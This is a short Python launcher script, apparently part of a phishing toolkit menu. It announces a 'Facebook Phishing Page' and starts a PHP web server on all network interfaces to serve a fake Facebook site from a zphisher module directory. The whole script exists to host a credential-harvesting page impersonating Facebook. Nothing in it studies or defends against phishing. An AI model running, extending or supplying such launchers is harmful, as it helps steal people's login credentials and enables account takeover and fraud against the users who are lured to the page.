import os

print("[📘] Launching Facebook Phishing Page...")
os.system("php -S 0.0.0.0:8080 -t modules/zphisher/sites/facebook")
input("Press Enter to return...")
